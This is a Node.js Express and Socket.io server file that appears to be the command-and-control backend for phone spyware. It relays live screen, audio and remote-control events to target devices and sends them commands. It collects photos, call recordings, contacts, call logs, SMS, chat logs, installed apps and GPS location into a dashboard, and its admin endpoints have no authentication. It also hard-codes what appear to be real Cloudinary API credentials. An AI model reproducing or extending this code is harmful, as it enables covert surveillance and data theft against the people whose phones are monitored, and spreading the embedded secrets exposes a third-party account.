const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression'); 

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// ✅ 1. OPTIMIZED SOCKET.IO SETUP
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8, // 100MB
    pingTimeout: 60000,     
    pingInterval: 25000,    
    transports: ['websocket', 'polling']
});

// --- CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); 
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage)
let devicesStatus = {}; 

// ==================================================
//  🔥 MAIN SOCKET LOGIC
// ==================================================
io.on('connection', (socket) => {
    
    // 1. Join Room
    socket.on('join', (roomID) => {
        socket.join(roomID);
        console.log(`🔌 Device Joined Room: ${roomID}`);
    });

    // 2. Screen Share
    socket.on('screen-data', (data) => {
        socket.volatile.to(data.room).emit('screen-data', data.image);
    });

    // 3. Control Events
    socket.on('control-event', (data) => {
        socket.to(data.room).emit('control-event', data);
    });

    // 4. Command Handling (Socket)
    socket.on('send-command', (data) => {
        if (data.targetId && data.command) {
            io.to(data.targetId).emit('command', data.command);
            
            // Backup for Polling
            if (!devicesStatus[data.targetId]) devicesStatus[data.targetId] = { id: data.targetId };
            devicesStatus[data.targetId].command = data.command;
        }
    });

    // 5. Audio Stream Relay
    socket.on('audio-stream', (blob) => {
        const rooms = socket.rooms;
        for (const room of rooms) {
            if (room !== socket.id) {
                socket.to(room).emit('audio-stream', blob);
            }
        }
    });

    socket.on('disconnect', () => { });
});

app.get('/', (req, res) => {
    res.send('✅ Server Running: Duplicate Data Fixed!');
});

// ==================================================
//  ✅ UPLOAD SYSTEM (Images)
// ==================================================
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; 
    
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderPath = id;
    if (type && type !== "null" && type !== "") folderPath = `${id}/${type}`; 

    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, 
        { folder: folderPath, public_id: Date.now().toString(), resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// ==================================================
//  ✅ AUDIO UPLOAD & HISTORY
// ==================================================
app.post('/api/upload-audio', (req, res) => {
    let { device_id, audio_data, filename } = req.body; 
    
    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderPath = `${id}/calls`; 
    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;

    cloudinary.uploader.upload(base64Audio, 
        { folder: folderPath, public_id: filename || Date.now().toString(), resource_type: "video" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.get('/api/audio-history/:device_id', async (req, res) => {
    const id = req.params.device_id.trim().toUpperCase();
    try {
        const result = await cloudinary.search
            .expression(`folder:${id}/calls AND resource_type:video`) 
            .sort_by('created_at', 'desc')
            .max_results(50)
            .execute();
        res.json(result.resources);
    } catch (error) {
        res.json([]); 
    }
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;
    
    cloudinary.api.resources({ 
        type: 'upload', 
        prefix: id + "/", 
        max_results: 100, 
        next_cursor: next_cursor, 
        direction: 'desc', 
        context: true 
    }, 
    (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

// ==================================================
//  🔥 STATUS & COMMAND (Loop Fix Included)
// ==================================================

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // 🔥 FIX: Command ek baar bhejo, fir turant 'none' kar do
        let commandToSend = "none";
        if (devicesStatus[id] && devicesStatus[id].command) {
            commandToSend = devicesStatus[id].command;
        }

        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
            speed: speed || (devicesStatus[id]?.speed || 0),
            lastSeen: Date.now(),
            command: "none" // 🔥 IMPORTANT: Reset to prevent loop
        };

        res.json({ status: "success", command: commandToSend });
    } catch (e) {
        res.status(500).json({ error: "Server Error" });
    }
});

// ==================================================
//  🔥 DATA STORAGE (Duplicate Fix Applied)
// ==================================================

app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        let finalData = parsedData;

        // --- LOCATION UPDATE ---
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
                devicesStatus[id].lastSeen = Date.now();
            }
        }

        // 🔥 CRITICAL FIX: CONTACTS & CALL LOGS SHOULD OVERWRITE (REPLACE) 🔥
        if (['contacts', 'installed_apps', 'call_logs'].includes(type)) {
             // Inka data humesha replace karo (Jodo mat)
             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        } 
        // 🔥 CHAT, SMS, NOTIFICATIONS SHOULD APPEND (ADD) 🔥
        else {
            let existingData = [];
            try {
                if (fs.existsSync(filePath)) {
                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
                    existingData = JSON.parse(fileContent);
                }
            } catch (e) { }

            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            
            // Chat Logs unique handle karne ke liye
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
            }
            
            // Naya + Purana (Limit 5000)
            finalData = [...newDataArray, ...existingData].slice(0, 5000); 
        }

        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });

    } catch (error) {
        console.error("Write Error:", error);
        res.status(500).json({ status: "error" });
    }
});

// ✅ MISSING API: Dashboard ko data dikhane ke liye ye zaroori hai
app.get('/api/get-data/:device_id/:type', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    try {
        if (fs.existsSync(filePath)) {
            const readStream = fs.createReadStream(filePath);
            readStream.pipe(res);
        } else {
            res.json([]);
        }
    } catch (e) {
        res.json([]);
    }
});

// Fallback command API
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    const id = device_id.toUpperCase().trim();
    
    // 1. Socket se live bhejo
    io.to(id).emit('command', command);

    // 2. Status mein save karo (polling ke liye)
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    devicesStatus[id].command = command;
    
    res.json({ status: "success", command: command });
});

server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
